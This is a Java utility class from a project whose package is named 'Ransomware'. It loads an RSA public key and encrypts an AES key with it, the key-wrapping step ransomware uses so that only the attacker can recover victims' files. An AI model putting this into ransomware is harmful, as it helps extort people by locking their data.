package Ransomware;

import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;
import java.nio.charset.StandardCharsets;
import java.security.KeyFactory;
import java.security.NoSuchAlgorithmException;
import java.security.PublicKey;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.X509EncodedKeySpec;
import java.util.Base64;

public class RSA_Utils {
    public static PublicKey loadPublicKey(String publicKey) throws NoSuchAlgorithmException, InvalidKeySpecException {
        byte[] data = Base64.getDecoder().decode(publicKey);
        X509EncodedKeySpec spec = new X509EncodedKeySpec(data);
        KeyFactory fact = KeyFactory.getInstance("RSA");
        return fact.generatePublic(spec);
    }
    public static String Encrypt(PublicKey pubKey, SecretKey aesKey) {
        String encryptedString = "";
        try {
            SecretKeySpec aesKeySpec = new SecretKeySpec(aesKey.getEncoded(),"AES");
            final String encodedKey = Base64.getEncoder().encodeToString(aesKeySpec.getEncoded());
            final byte[] plainBytes = encodedKey.getBytes(StandardCharsets.UTF_8);
            final Cipher cipher = Cipher.getInstance("RSA");
            cipher.init(Cipher.ENCRYPT_MODE, pubKey);
            final byte[] encrypted = cipher.doFinal(plainBytes);
            encryptedString = new String(Base64.getEncoder().encode(encrypted));
            return encryptedString;
        } catch (Exception e){
            e.printStackTrace();
        }
        return encryptedString;
    }
}
